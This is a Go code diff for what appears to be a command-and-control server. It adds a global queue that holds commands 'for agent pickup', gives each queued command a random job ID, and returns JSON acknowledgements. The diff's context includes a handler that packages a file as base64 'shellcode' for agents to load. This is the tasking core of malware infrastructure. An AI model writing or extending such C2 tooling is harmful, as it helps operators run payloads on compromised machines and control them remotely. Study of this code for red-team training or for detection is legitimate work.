@@ -6,15 +6,29 @@ import (
 	"fmt"
 	"io"
 	"log"
+	"math/rand"
 	"net/http"
 	"os"
 	"strings"
+	"sync"
 )
+
+// CommandQueue stores commands ready for agent pickup
+type CommandQueue struct {
+	PendingCommands []CommandType
+	mu              sync.Mutex
+}
+
+// Global command queue
+var AgentCommands = CommandQueue{
+	PendingCommands: make([]CommandType, 0),
+}
 
 // CommandType represents a command with its arguments
 type CommandType struct {
 	Command   string          `json:"command"`
 	Arguments json.RawMessage `json:"data,omitempty"`
+	JobID     string          `json:"job_id"`
 }
 
 type CommandValidator func(json.RawMessage) error
@@ -93,9 +107,19 @@ func handleCommand(w http.ResponseWriter, r *http.Request) {
 	cmdType.Arguments = processedArgs
 	log.Printf("Processed command arguments: %s", cmdType.Command)
 
+	// Create random JOB ID
+	cmdType.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
+	log.Printf("Job ID assigned: %s", cmdType.JobID)
+
+	// Queue the validated and processed command
+	AgentCommands.addCommand(cmdType)
+
 	// Confirm on the client side command was received
 	w.WriteHeader(http.StatusOK)
-	json.NewEncoder(w).Encode("Received command")
+	json.NewEncoder(w).Encode(map[string]string{
+		"status":  "success",
+		"message": fmt.Sprintf("Command '%s' accepted", cmdType.Command),
+	})
 
 }
 
@@ -176,4 +200,13 @@ func processLoadCommand(rawArgs json.RawMessage) (json.RawMessage, error) {
 		clientArgs.FilePath, len(fileBytes), len(shellcodeB64))
 
 	return processedJSON, nil
+}
+
+// addCommand adds a validated command to the queue
+func (cq *CommandQueue) addCommand(command CommandType) {
+	cq.mu.Lock()
+	defer cq.mu.Unlock()
+
+	cq.PendingCommands = append(cq.PendingCommands, command)
+	log.Printf("QUEUED: Command %s with ID %s", command.Command, command.JobID)
 }
